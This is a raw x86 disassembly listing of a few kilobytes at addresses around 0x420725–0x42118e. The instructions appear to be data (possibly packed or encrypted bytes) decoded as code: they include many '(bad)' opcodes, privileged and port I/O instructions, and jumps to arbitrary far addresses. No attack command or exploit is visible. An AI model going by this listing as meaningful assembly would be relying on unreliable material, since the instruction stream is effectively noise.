  420725:	mov    edx,DWORD PTR [edx-0x6f]
  420728:	out    dx,eax
  420729:	mov    al,ds:0x453ba843
  42072e:	(bad)  
  42072f:	(bad)  
  420730:	fnstsw WORD PTR [edi]
  420732:	es adc eax,0x517e21ae
  420738:	lods   al,BYTE PTR ds:[esi]
  420739:	mov    ?,WORD PTR ds:0x127f459b
  42073f:	cli    
  420740:	push   0x68bf8fed
  420745:	jns    0x42077a
  420747:	loope  0x420712
  420749:	inc    ebx
  42074a:	add    al,0xdd
  42074c:	xchg   dl,al
  42074e:	fwait
  42074f:	int3   
  420750:	stos   BYTE PTR es:[edi],al
  420751:	mov    ds:0x80471497,eax
  420756:	or     bh,BYTE PTR [eax-0x5e]
  420759:	inc    edx
  42075a:	int3   
  42075b:	jmp    0xa326b72d
  420760:	and    esp,DWORD PTR [esi-0x55]
  420763:	xchg   ebx,eax
  420764:	add    BYTE PTR [esi],0x9a
  420767:	cmp    bl,BYTE PTR [ecx+0x29463274]
  42076d:	xlat   BYTE PTR ds:[ebx]
  42076e:	mov    DWORD PTR [esi+0x9],eax
  420771:	push   ss
  420772:	fmul   DWORD PTR [esi-0x3c58b4df]
  420778:	push   esi
  420779:	pxor   mm3,QWORD PTR [si+0xa]
  42077e:	pushf  
  42077f:	adc    al,0xa0
  420781:	mov    WORD PTR [eax-0x2],gs
  420784:	xor    bh,ah
  420786:	pop    ebx
  420787:	cld    
  420788:	inc    esi
  420789:	mov    esp,esp
  42078b:	jl     0x420716
  42078d:	xchg   esp,eax
  42078e:	call   0x422039
	...
  4207f3:	add    BYTE PTR [ecx-0x587fdad1],cl
  4207f9:	mov    ch,BYTE PTR [ebp-0x2390c6d1]
  4207ff:	pusha  
  420800:	jle    0x42086c
  420802:	cld    
  420803:	idiv   BYTE PTR [edx+0x5a]
  420806:	add    DWORD PTR [eax],eax
  420808:	add    eax,0x94000001
  42080d:	ret    
  42080e:	xchg   ebp,eax
  42080f:	(bad)  
  420810:	and    BYTE PTR [ebp+0x1b],0xa8
  420814:	cld    
  420815:	sub    BYTE PTR [edx-0x68],dh
  420818:	cmp    edi,esp
  42081a:	adc    ecx,DWORD PTR [ebp+0x3d2250ca]
  420820:	jle    0x4207d6
  420822:	mov    eax,ds:0xa795ccc5
  420827:	fadd   DWORD PTR [ecx]
  420829:	adc    eax,0xa2cb5c15
  42082e:	imul   esi,esi,0x68
  420831:	xchg   ebp,eax
  420832:	push   0x10b48279
  420837:	and    eax,0x3bff971a
  42083c:	int    0x2a
  42083e:	lods   eax,DWORD PTR ds:[esi]
  42083f:	xchg   DWORD PTR [edi-0x4],ecx
  420842:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420843:	scas   eax,DWORD PTR es:[edi]
  420844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420845:	adc    dl,BYTE PTR [ecx-0x73]
  420848:	fwait
  420849:	loop   0x4207cb
  42084b:	xlat   BYTE PTR ds:[ebx]
  42084c:	add    ebx,DWORD PTR [ebx-0x77f797d7]
  420852:	add    eax,0x94ade61e
  420857:	loope  0x4208cc
  420859:	jb     0x42085b
  42085b:	mov    DWORD PTR [edi+edi*1-0x5f7262ac],ebp
  420862:	mov    bh,0xb
  420864:	cmc    
  420865:	(bad)  
  420866:	pop    ecx
  420867:	sub    bl,dh
  420869:	sub    eax,0xc5bbf075
  42086e:	mov    ds:0xc8e2b4c1,eax
  420873:	mov    ds:0xd27f021,eax
  420878:	push   ebx
  420879:	sub    bh,ch
  42087b:	repz aas 
  42087d:	jmp    0x1bc1:0xd74be583
  420884:	dec    ebx
  420885:	(bad)
  42088a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42088b:	out    0x29,eax
  42088d:	adc    esp,ebx
  42088f:	jle    0x42081f
  420891:	pusha  
  420892:	push   esp
  420893:	add    DWORD PTR [eax+0x2952fc16],ecx
  420899:	add    ebp,DWORD PTR [edx-0x2]
  42089c:	popf   
  42089d:	leave  
  42089e:	add    WORD PTR [esi],bp
  4208a1:	sbb    al,0xb0
  4208a3:	cld    
  4208a4:	and    edx,DWORD PTR [eax+ebp*8-0x7e3dc133]
  4208ab:	mov    ebx,0xea8f1fb8
  4208b0:	das    
  4208b1:	jmp    0x512f95cf
  4208b6:	pop    ds
  4208b7:	jbe    0x420879
  4208b9:	sbb    bh,BYTE PTR [edx+0x77a189fe]
  4208bf:	jmp    0x4208c0
  4208c1:	add    eax,0x9c93db8d
  4208c6:	lahf   
  4208c7:	push   eax
  4208c8:	jle    0x42085c
  4208ca:	xlat   BYTE PTR ds:[ebx]
  4208cb:	in     al,0xbb
  4208cd:	div    dh
  4208cf:	mov    bl,0xb7
  4208d1:	jmp    0x4208ae
  4208d3:	sub    DWORD PTR [eax],edi
  4208d5:	pop    ss
  4208d6:	bound  edx,QWORD PTR [edx]
  4208d8:	cwde   
  4208d9:	sti    
  4208da:	inc    edx
  4208db:	and    bl,BYTE PTR [ecx]
  4208dd:	arpl   ax,cx
  4208df:	jae    0x42094b
  4208e1:	add    ecx,DWORD PTR ds:0xe283f5ce
  4208e7:	hlt    
  4208e8:	inc    edi
  4208e9:	jl     0x420880
  4208eb:	retf   0xdc6e
  4208ee:	daa    
  4208ef:	jg     0x42089e
  4208f1:	nop
  4208f2:	fidiv  DWORD PTR [edi+ecx*2-0x2bc45b22]
  4208f9:	push   0x77
  4208fb:	jne    0x4208ee
  4208fd:	loopne 0x42088a
  4208ff:	mov    edi,0x87e783f1
  420904:	jle    0x4208be
  420906:	sti    
  420907:	mov    edx,0x183acc85
  42090c:	dec    ecx
  42090d:	or     BYTE PTR [ecx+0x74],0xc4
	...
  420971:	add    BYTE PTR [eax],al
  420973:	add    ah,bl
  420975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420976:	jae    0x4209c5
  420978:	jnp    0x420959
  42097a:	(bad)  
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0x4b
  420981:	fidiv  DWORD PTR [ecx]
  420983:	or     DWORD PTR [edi+0x5b],edi
  420986:	add    DWORD PTR [eax],eax
  420988:	add    eax,0x65000001
  42098d:	jl     0x42091f
  42098f:	sub    bh,dl
  420991:	inc    edi
  420992:	ins    BYTE PTR es:[edi],dx
  420993:	mov    eax,ds:0x522846e5
  420998:	js     0x420941
  42099a:	jp     0x420993
  42099c:	rcr    bl,cl
  42099e:	test   esi,ebx
  4209a0:	mov    DWORD PTR [ebx-0x6b9b8efc],esp
  4209a6:	nop
  4209a7:	adc    BYTE PTR [ebx-0x34],0x1c
  4209ab:	xor    esi,DWORD PTR [edx]
  4209ad:	loop   0x420947
  4209af:	int3   
  4209b0:	jge    0x4209af
  4209b2:	adc    DWORD PTR [eax],ebx
  4209b4:	adc    DWORD PTR [edi-0x12],ebp
  4209b7:	aad    0xb2
  4209b9:	in     eax,0x31
  4209bb:	inc    esi
  4209bc:	sbb    BYTE PTR [edx+0x5c],cl
  4209bf:	or     ebp,0xffffffae
  4209c2:	inc    ebp
  4209c3:	test   eax,0x5e99965d
  4209c8:	sub    BYTE PTR [esp+esi*2-0x53],bl
  4209cc:	(bad)  
  4209cd:	in     eax,dx
  4209ce:	pop    ebp
  4209cf:	pop    ds
  4209d0:	mov    ah,0xe5
  4209d2:	test   BYTE PTR ds:0xf99b423b,0xa7
  4209d9:	cmp    BYTE PTR [eax+0x23],al
  4209dc:	int    0x48
  4209de:	mov    ch,0x28
  4209e0:	push   ebp
  4209e1:	aad    0xd5
  4209e3:	into   
  4209e4:	xor    dl,bl
  4209e6:	and    ecx,ebx
  4209e8:	mov    ds:0x194166c3,al
  4209ed:	cld    
  4209ee:	jge    0x420973
  4209f0:	mov    bh,0x8f
  4209f2:	sti    
  4209f3:	dec    edi
  4209f4:	sahf   
  4209f5:	cmp    eax,0x98298dd
  4209fa:	pop    esp
  4209fb:	into   
  4209fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209fd:	cmp    al,0x34
  4209ff:	sar    BYTE PTR [edx],1
  420a01:	push   ss
  420a02:	shr    BYTE PTR [ebp-0x31a57ab5],1
  420a08:	mov    cl,0x75
  420a0a:	mov    dh,0xa
  420a0c:	fdivr  st(5),st
  420a0e:	xchg   esp,eax
  420a0f:	imul   esi,DWORD PTR [ebp+0x56],0xd29d62d
  420a16:	mov    DWORD PTR [edx+0x514ac18f],0x17b375cc
  420a20:	ror    BYTE PTR [ebx],0x9a
  420a23:	push   ebp
  420a24:	(bad)  
  420a25:	fsubp  st(2),st
  420a27:	dec    esi
  420a28:	iret   
  420a29:	jae    0x420a92
  420a2b:	push   0xffffffbb
  420a2d:	addr16 mov esi,0x38cef516
  420a33:	fs fwait
  420a35:	shl    edi,1
  420a37:	enter  0xd04f,0x76
  420a3b:	lods   eax,DWORD PTR ss:[esi]
  420a3d:	outs   dx,DWORD PTR ds:[esi]
  420a3e:	aam    0xa5
  420a40:	cli    
  420a41:	sub    DWORD PTR [ebp+0x7363edaa],0xa87f49f9
  420a4b:	shl    BYTE PTR [edi+edi*2-0xabda8dc],0x13
  420a53:	pop    ds
  420a54:	sti    
  420a55:	mov    bh,0xc6
  420a57:	push   ebp
  420a58:	dec    ecx
  420a59:	jae    0x420a75
  420a5b:	pusha  
  420a5c:	push   0xffffffeb
  420a5e:	out    0x90,eax
  420a60:	sub    ah,0xa8
  420a63:	fist   WORD PTR fs:[esi+0x1e104a8c]
  420a6a:	mov    ecx,0xd8001ca3
  420a6f:	ins    BYTE PTR es:[edi],dx
  420a70:	fnstsw WORD PTR ds:0xf12bbf8e
  420a76:	(bad)  
  420a78:	pop    es
  420a79:	popa   
  420a7a:	push   es
  420a7b:	sub    bl,BYTE PTR [ebx*1-0x300a51d8]
  420a82:	mov    bl,0x43
  420a84:	loop   0x420adc
  420a86:	lods   eax,DWORD PTR ds:[esi]
  420a87:	dec    ecx
  420a88:	mov    esp,0xf221eb05
  420a8d:	push   eax
  420a8e:	data16 add bh,ch
	...
  420af1:	add    BYTE PTR [eax],al
  420af3:	add    bh,bl
  420af5:	xor    ch,BYTE PTR [edi-0x6010ed]
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	xor    BYTE PTR [eax+ebp*1+0x61],0x84
  420b05:	pop    esp
  420b06:	add    DWORD PTR [eax],eax
  420b08:	add    eax,0xe8000001
  420b0d:	add    eax,0x2260a1ee
  420b12:	adc    eax,0xcb4e4c23
  420b17:	mov    ecx,0x653025eb
  420b1c:	jg     0x420af9
  420b1e:	jns    0x420b04
  420b20:	mov    WORD PTR [edi+0x507dac74],es
  420b26:	(bad)  
  420b27:	jne    0x420ba1
  420b29:	jmp    0x1ea6:0x94f32057
  420b30:	aam    0x80
  420b32:	mov    al,ds:0x70ea6790
  420b37:	and    ebx,DWORD PTR [edx]
  420b39:	les    eax,FWORD PTR [ebx]
  420b3b:	jmp    0xdc6609aa
  420b40:	and    dl,bl
  420b42:	scas   eax,DWORD PTR es:[edi]
  420b43:	sub    DWORD PTR ds:0xd87c89bd,ebp
  420b49:	(bad)  
  420b4a:	out    dx,al
  420b4b:	mov    ebx,0xca8828ee
  420b50:	stos   BYTE PTR es:[edi],al
  420b51:	imul   esi,DWORD PTR [ebx-0x77],0x5f
  420b55:	xor    DWORD PTR [edx],ebx
  420b57:	ror    dl,cl
  420b59:	adc    edi,esi
  420b5b:	cs fxch st(7)
  420b5e:	in     al,dx
  420b5f:	outs   dx,BYTE PTR ds:[esi]
  420b60:	push   edi
  420b61:	mov    al,ds:0xde5eee29
  420b66:	cld    
  420b67:	lods   eax,DWORD PTR ds:[esi]
  420b68:	ret    0xacba
  420b6b:	push   edi
  420b6c:	xor    DWORD PTR [ecx+0x61b75a75],eax
  420b72:	test   al,0x4
  420b74:	mov    ds:0x5e483247,al
  420b79:	xchg   esi,eax
  420b7a:	enter  0x98e1,0x34
  420b7e:	xchg   esp,eax
  420b7f:	icebp  
  420b80:	popa   
  420b81:	test   al,0xe7
  420b83:	(bad)  
  420b85:	push   cs
  420b86:	mov    dh,0x86
  420b88:	ins    BYTE PTR es:[edi],dx
  420b89:	nop
  420b8a:	rcr    DWORD PTR [edi-0x4d],0x1d
  420b8e:	and    eax,ecx
  420b90:	stos   BYTE PTR es:[edi],al
  420b91:	sbb    dh,BYTE PTR [eax+0x76b3a8ee]
  420b97:	in     al,dx
  420b98:	iret   
  420b99:	dec    ebx
  420b9a:	and    BYTE PTR [eax+0x30],0x4f
  420b9e:	fimul  DWORD PTR [ebx]
  420ba0:	ficom  WORD PTR [ebx-0x5e]
  420ba3:	sbb    BYTE PTR [edx],ah
  420ba5:	mov    al,ds:0x87805023
  420baa:	and    eax,0x63c8ae0b
  420baf:	pop    ss
  420bb0:	cmp    edx,esp
  420bb2:	icebp  
  420bb3:	cs mov ah,0x60
  420bb6:	dec    esp
  420bb7:	rcl    esi,1
  420bb9:	in     al,dx
  420bba:	push   ss
  420bbb:	scas   eax,DWORD PTR es:[edi]
  420bbc:	inc    ebp
  420bbd:	sub    DWORD PTR gs:[ebx],eax
  420bc0:	ja     0x420b90
  420bc2:	shr    ecx,0xf6
  420bc5:	ret    0x3556
  420bc8:	add    esi,eax
  420bca:	sbb    eax,0x9fe3b606
  420bcf:	jl     0x420b6a
  420bd1:	push   ds
  420bd2:	ret    0xfe6d
  420bd5:	and    al,0xc9
  420bd7:	sub    BYTE PTR [esi+0x4a],cl
  420bda:	test   DWORD PTR [ebp+0x24755f09],ebx
  420be0:	lock rcr BYTE PTR [ebp-0x603cce7],1
  420be7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420be8:	pop    esp
  420be9:	dec    ebx
  420bea:	sbb    eax,DWORD PTR [ebp-0x4425c286]
  420bf0:	imul   esp,DWORD PTR [ebx-0x6645ca06],0xef39a875
  420bfa:	out    dx,al
  420bfb:	and    esi,ecx
  420bfd:	push   ecx
  420bfe:	mov    ds:0x4d20e3a9,eax
  420c03:	dec    esp
  420c04:	int    0x5f
  420c06:	out    0x43,al
  420c08:	rcl    DWORD PTR [ebx-0x19],1
  420c0b:	mov    dh,0x7d
  420c0d:	inc    ecx
  420c0e:	enter  0x2595,0x0
	...
  420c72:	add    BYTE PTR [eax],al
  420c74:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420c7a:	mov    edx,0x1886e3f
  420c7f:	in     eax,0x3
  420c81:	xlat   BYTE PTR ds:[ebx]
  420c82:	xor    esp,DWORD PTR [ebx]
  420c84:	mov    DWORD PTR [ebp+0x1],ebx
  420c87:	add    BYTE PTR ds:0xe5000001,al
  420c8d:	inc    ebx
  420c8e:	sub    al,0x22
  420c90:	fld    DWORD PTR [ebx-0x20b5fa54]
  420c96:	clc    
  420c97:	cmp    eax,0xb29baa83
  420c9c:	push   ecx
  420c9d:	imul   eax,DWORD PTR [edx+eiz*8+0x64fce3b],0xf260e797
  420ca8:	mov    al,0xc
  420caa:	mov    dl,0x15
  420cac:	xchg   DWORD PTR [eax+0x593a1c4d],ecx
  420cb2:	lds    ecx,FWORD PTR ds:0x2be5d602
  420cb8:	or     esp,DWORD PTR [ecx+0x104af49b]
  420cbe:	popf   
  420cbf:	push   ss
  420cc0:	popa   
  420cc1:	jno    0x420c6e
  420cc3:	icebp  
  420cc4:	stos   DWORD PTR es:[edi],eax
  420cc5:	jns    0x420c98
  420cc7:	imul   edx,edi,0xffffff97
  420cca:	shr    BYTE PTR [edi],1
  420ccc:	jp     0x420cf3
  420cce:	inc    edi
  420ccf:	mov    esp,0x8251a3d0
  420cd4:	das    
  420cd5:	mov    BYTE PTR [esi+0x1a],dl
  420cd8:	xor    al,0xe
  420cda:	sbb    BYTE PTR [esi-0x2f],dl
  420cdd:	and    eax,0xdbaf12cb
  420ce2:	les    esi,FWORD PTR [edi-0x3bdd1c9f]
  420ce8:	fs sub edi,ecx
  420ceb:	test   bl,ch
  420ced:	ret    
  420cee:	inc    esp
  420cef:	or     ah,BYTE PTR [ecx]
  420cf1:	xchg   esp,eax
  420cf2:	or     BYTE PTR [edx],ah
  420cf4:	dec    edx
  420cf5:	data16 lods al,BYTE PTR ds:[esi]
  420cf7:	scas   eax,DWORD PTR es:[edi]
  420cf8:	cmp    eax,DWORD PTR [eax+0x65]
  420cfb:	mov    ebp,0xf343d717
  420d00:	sbb    DWORD PTR [edi],ebx
  420d02:	mov    bh,0x2d
  420d04:	cld    
  420d05:	sbb    eax,DWORD PTR [ebx+0x6cfe412]
  420d0b:	push   cs
  420d0c:	cmp    BYTE PTR [edx+0x2e5872ab],dl
  420d12:	lock mov edx,0x803ef324
  420d18:	mov    bl,0x4a
  420d1a:	hlt    
  420d1b:	jmp    0xf5b9d700
  420d20:	sbb    DWORD PTR [ecx],esi
  420d22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d23:	sar    DWORD PTR [edi],cl
  420d25:	dec    ecx
  420d26:	test   al,0xd9
  420d28:	(bad)  
  420d29:	and    al,0x39
  420d2b:	inc    edi
  420d2c:	and    DWORD PTR [ebp-0x18],0xffffff84
  420d30:	xchg   edx,eax
  420d31:	js     0x420da5
  420d33:	and    DWORD PTR [edx-0x818bb11],esi
  420d39:	jle    0x420d71
  420d3b:	shl    bh,0x16
  420d3e:	mov    bl,BYTE PTR [esi+0x67]
  420d41:	or     eax,0x1b3e856b
  420d46:	xlat   BYTE PTR ds:[ebx]
  420d47:	repnz fdivrp st(4),st
  420d4a:	inc    esp
  420d4b:	mov    dh,0x64
  420d4d:	in     eax,0xb7
  420d4f:	dec    eax
  420d50:	push   es
  420d51:	popf   
  420d52:	dec    esp
  420d53:	or     DWORD PTR [eax+0x249c0198],0x2b1a6f7b
  420d5d:	mov    eax,ds:0x1d79dcac
  420d62:	inc    edx
  420d63:	fild   DWORD PTR [edi]
  420d65:	sti    
  420d66:	cmc    
  420d67:	loope  0x420dab
  420d69:	ja     0x420d77
  420d6b:	std    
  420d6c:	fdivr  DWORD PTR [ebp-0x3]
  420d6f:	cmp    al,0xef
  420d71:	inc    ebx
  420d72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d73:	popa   
  420d74:	hlt    
  420d75:	mov    ch,bh
  420d77:	push   edx
  420d78:	xchg   ebx,eax
  420d79:	jle    0x420d0e
  420d7b:	xor    BYTE PTR [ecx],cl
  420d7d:	aad    0x51
  420d7f:	add    al,0x39
  420d81:	iret   
  420d82:	(bad)  
  420d83:	les    edi,FWORD PTR [edi+0x46]
  420d86:	jno    0x420dc7
  420d88:	(bad)  
  420d89:	or     ebp,ebx
  420d8b:	cmp    edi,DWORD PTR [edx+ebx*1+0x39ef82]
	...
  420df2:	add    BYTE PTR [eax],al
  420df4:	out    0x1e,eax
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0x435fa103
  420e04:	mov    ds,WORD PTR [esi+0x1]
  420e07:	add    BYTE PTR ds:0x45000001,al
  420e0d:	cmp    ah,0x2e
  420e10:	adc    eax,0x9382c854
  420e15:	(bad)  
  420e16:	out    dx,al
  420e17:	lock cwde 
  420e19:	cld    
  420e1a:	adc    DWORD PTR [ecx+0x87b6a09],ebx
  420e20:	mov    ds:0x389c0edc,eax
  420e25:	inc    edx
  420e26:	cmp    DWORD PTR ds:0x73d89e86,0xffffff92
  420e2d:	and    al,BYTE PTR [eax-0x73e20c5b]
  420e33:	fimul  WORD PTR [ebp-0x5b]
  420e36:	jp     0x420dca
  420e38:	jno    0x420e7f
  420e3a:	xchg   edi,edx
  420e3c:	add    ah,0x33
  420e3f:	iret   
  420e40:	mov    bh,0x9
  420e42:	scas   al,BYTE PTR es:[edi]
  420e43:	sub    ch,BYTE PTR [esi+0x6a]
  420e46:	rcr    BYTE PTR [eax+0x455d17e8],1
  420e4c:	lods   al,BYTE PTR ds:[esi]
  420e4d:	pop    edx
  420e4e:	outs   dx,BYTE PTR ds:[esi]
  420e4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e50:	jae    0x420e16
  420e52:	xor    ah,BYTE PTR [ebp-0x44ce5169]
  420e58:	fcomi  st,st(6)
  420e5a:	pop    esp
  420e5b:	jno    0x420e63
  420e5d:	jmp    0x6720:0x92b79035
  420e64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e65:	and    ebp,DWORD PTR [esi+0xb]
  420e68:	jg     0x420e18
  420e6a:	add    al,0xfd
  420e6c:	mov    esi,DWORD PTR [edi]
  420e6e:	stc    
  420e6f:	popf   
  420e70:	arpl   WORD PTR [ecx+ebx*2+0x6c],si
  420e74:	sub    ecx,DWORD PTR [ebp-0x50]
  420e77:	xchg   ecx,eax
  420e78:	xchg   edx,eax
  420e79:	jne    0x420e37
  420e7b:	pusha  
  420e7c:	jmp    0xaad1:0xed87ae31
  420e83:	jne    0x420e6d
  420e85:	cld    
  420e86:	adc    BYTE PTR ss:[edi-0x52595c45],ch
  420e8d:	mov    edx,0x6006d228
  420e92:	repnz fstp TBYTE PTR cs:[eax+0x1b]
  420e97:	retf   0x65a6
  420e9a:	(bad)  
  420e9b:	aam    0x8b
  420e9d:	adc    al,cl
  420e9f:	push   0x8cb8fbcd
  420ea4:	rcr    DWORD PTR [ebx-0x447f07c2],0x3
  420eab:	es cmp al,dh
  420eae:	xchg   ebx,eax
  420eaf:	fild   WORD PTR [esi+0x5acd9408]
  420eb5:	cmp    dh,BYTE PTR [esi+0x4b]
  420eb8:	in     eax,0x22
  420eba:	mov    ds:0x54138107,al
  420ebf:	loop   0x420e77
  420ec1:	pop    ecx
  420ec2:	sub    dh,BYTE PTR [ebx]
  420ec4:	cmp    DWORD PTR [ebp+0x5e],ebx
  420ec7:	push   0x6c
  420ec9:	cmp    edi,DWORD PTR [esi+esi*8]
  420ecc:	clc    
  420ecd:	loope  0x420ef7
  420ecf:	cmp    BYTE PTR [ecx+0xd],ch
  420ed2:	add    esi,esi
  420ed4:	xchg   ecx,eax
  420ed5:	push   0xdbc0f3ac
  420eda:	sbb    edi,ebx
  420edc:	outs   dx,DWORD PTR ds:[esi]
  420edd:	(bad)  
  420ede:	stos   BYTE PTR es:[edi],al
  420edf:	mov    DWORD PTR [edx+ecx*2],esi
  420ee2:	rcr    DWORD PTR [edx+esi*2],cl
  420ee5:	xchg   BYTE PTR [edi+0x2d],dh
  420ee8:	jl     0x420ede
  420eea:	test   BYTE PTR [eax],bl
  420eec:	(bad)  
  420eed:	leave  
  420eee:	int3   
  420eef:	push   ecx
  420ef0:	cmp    BYTE PTR [eax-0x36252783],ch
  420ef6:	fwait
  420ef7:	lahf   
  420ef8:	ficom  WORD PTR [esi-0x10]
  420efb:	jno    0x420f63
  420efd:	inc    ebx
  420efe:	mov    dl,0xb
  420f00:	ds inc edi
  420f02:	pop    edi
  420f03:	ror    BYTE PTR ds:0x636413ef,1
  420f09:	push   ebp
  420f0a:	jne    0x420ed8
  420f0c:	push   0x28ab428c
	...
  420f71:	add    BYTE PTR [eax],al
  420f73:	add    BYTE PTR [eax],ah
  420f75:	xchg   edi,eax
  420f76:	inc    edx
  420f77:	shl    edi,cl
  420f79:	xlat   BYTE PTR ds:[ebx]
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0x72276947]
  420f84:	xchg   ebx,eax
  420f85:	pop    edi
  420f86:	add    DWORD PTR [eax],eax
  420f88:	add    eax,0x9000001
  420f8d:	mov    bl,0x60
  420f8f:	outs   dx,BYTE PTR ds:[esi]
  420f90:	adc    ecx,DWORD PTR [eax-0x4]
  420f93:	mov    bh,0x7e
  420f95:	sbb    DWORD PTR [esi-0x1b],0x25
  420f99:	call   0xcc62:0xab68c828
  420fa0:	inc    ecx
  420fa1:	and    ah,BYTE PTR [eax]
  420fa3:	icebp  
  420fa4:	xor    bl,BYTE PTR gs:[eax+0x54d4233a]
  420fab:	xchg   esp,eax
  420fac:	cmp    esp,ebp
  420fae:	iret   
  420faf:	adc    al,0x71
  420fb1:	int    0xa4
  420fb3:	xor    eax,0x8335c252
  420fb8:	add    al,0x9b
  420fba:	xor    dl,BYTE PTR [eax]
  420fbc:	xchg   BYTE PTR ds:0x27f984,dh
  420fc2:	cli    
  420fc3:	fadd   DWORD PTR [eax+0x1e810997]
  420fc9:	inc    esi
  420fca:	dec    esi
  420fcb:	push   edi
  420fcc:	add    al,0x6c
  420fce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fcf:	hlt    
  420fd0:	and    DWORD PTR [ebp-0x1],0xffffffd7
  420fd4:	jl     0x421028
  420fd6:	and    al,0x82
  420fd8:	mov    al,ds:0x4d0cf949
  420fdd:	out    dx,eax
  420fde:	(bad)  
  420fdf:	pop    edx
  420fe0:	(bad)  
  420fe1:	std    
  420fe2:	cdq    
  420fe3:	mov    bl,0x19
  420fe5:	addr16 cdq 
  420fe7:	jnp    0x42100f
  420fe9:	mov    ebp,0xad1f359d
  420fee:	sub    BYTE PTR [ebp+0x54dc6351],al
  420ff4:	rcl    BYTE PTR [eax-0x53],1
  420ff7:	cmp    al,0x8a
  420ff9:	push   ebx
  420ffa:	sub    ah,BYTE PTR [eax+0x63]
  420ffd:	shr    BYTE PTR [edi+0x2ff50c6],cl
  421003:	addr16 int 0x47
  421006:	pop    ecx
  421007:	mov    ds:0xd8f10d13,al
  42100c:	or     DWORD PTR [ecx+0x40],0x5cbbb376
  421013:	jbe    0x420ff4
  421015:	dec    ebx
  421016:	push   ds
  421017:	dec    ebx
  421018:	cs mov edx,0x38773612
  42101e:	enter  0xae1f,0xf0
  421022:	call   0x463e:0x8e3f8e1b
  421029:	mov    edi,0xe3044e7f
  42102e:	mov    ds:0xf002a998,eax
  421033:	fs imul ecx,edi,0xbddea6b6
  42103a:	jp     0x42101d
  42103c:	leave  
  42103d:	add    esp,0xb
  421040:	mov    ds:0x8d56bfd7,al
  421045:	push   cs
  421046:	cwde   
  421047:	shr    DWORD PTR [ebx-0x58],0x8b
  42104b:	fistp  WORD PTR [edi-0x57]
  42104e:	(bad)  
  42104f:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  421051:	dec    esp
  421052:	or     DWORD PTR [ebx],0xe51032f5
  421058:	ss je  0x421082
  42105b:	inc    ebx
  42105c:	cmp    esi,eax
  42105e:	or     BYTE PTR [eax],0x65
  421061:	repz in eax,dx
  421063:	push   ebx
  421064:	les    esi,FWORD PTR [esi]
  421066:	retf   
  421067:	inc    DWORD PTR [eax-0x10c09cb]
  42106d:	add    eax,DWORD PTR [ebp-0x4938f2aa]
  421073:	lock mov ch,0xd2
  421076:	out    dx,eax
  421077:	push   ebp
  421078:	mov    al,0x0
  42107a:	jb     0x42107c
  42107c:	das    
  42107d:	xchg   ebx,eax
  42107e:	rcr    DWORD PTR [eax-0x3f637f34],cl
  421084:	mov    al,ds:0x9c443602
  421089:	pop    edi
  42108a:	or     cl,BYTE PTR [edi+0x21]
  42108d:	cmc    
  42108e:	imul   edi,DWORD PTR [ebx],0x64
	...
  4210f1:	add    BYTE PTR [eax],al
  4210f3:	add    BYTE PTR [edi-0x243925a2],bl
  4210f9:	(bad)  
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    es,WORD PTR [ebx+esi*8-0x6e]
  421103:	cwde   
  421104:	cwde   
  421105:	pusha  
  421106:	add    DWORD PTR [eax],eax
  421108:	add    eax,0x2c000001
  42110d:	loopne 0x4210f1
  42110f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421110:	jno    0x42109d
  421112:	std    
  421113:	mov    dh,0xf
  421115:	sub    edi,DWORD PTR [esp+edi*4+0x16]
  421119:	popf   
  42111a:	into   
  42111b:	fs dec esi
  42111d:	cmc    
  42111e:	out    0xa0,al
  421120:	sbb    ch,BYTE PTR [edx+0x7edca3e6]
  421126:	mov    ebx,0xebe7248d
  42112b:	icebp  
  42112c:	mov    ecx,0xc980aa87
  421131:	fwait
  421132:	xchg   edi,eax
  421133:	fwait
  421134:	mov    WORD PTR [esi+eax*2+0x4f],es
  421138:	clc    
  421139:	sbb    al,0xf
  42113b:	outs   dx,DWORD PTR ds:[esi]
  42113c:	js     0x4210cf
  42113e:	dec    edi
  42113f:	popa   
  421140:	out    dx,eax
  421141:	or     ch,BYTE PTR [ecx+edx*1-0x6f8bfcf5]
  421148:	pop    ds
  421149:	out    0x8c,eax
  42114b:	xchg   ebx,eax
  42114c:	mov    esp,0x6386186f
  421151:	aad    0xae
  421153:	xor    eax,DWORD PTR [ecx+ebp*8-0x2f]
  421157:	mov    eax,ds:0x99ffca8e
  42115c:	mov    ds:0x110d7b3e,eax
  421161:	cwde   
  421162:	dec    eax
  421163:	outs   dx,BYTE PTR ds:[esi]
  421164:	dec    ecx
  421165:	sti    
  421166:	push   0xffffffee
  421168:	pop    ds
  421169:	xlat   BYTE PTR ds:[ebx]
  42116a:	xor    ebp,ecx
  42116c:	loope  0x4211dd
  42116e:	in     eax,0x46
  421170:	sbb    dl,BYTE PTR [edi-0xd]
  421173:	push   cs
  421174:	clc    
  421175:	sub    BYTE PTR [esi-0x79],0xe0
  421179:	cld    
  42117a:	int3   
  42117b:	stc    
  42117c:	push   0x4ec8c4ab
  421181:	and    dl,BYTE PTR [edi+0x6098e17b]
  421187:	push   edx
  421188:	cli    
  421189:	ja     0x42119d
  42118b:	jg     0x4211db
  42118d:	pop    ebp
  42118e:	scas   al,BYTE PTR es:[edi]
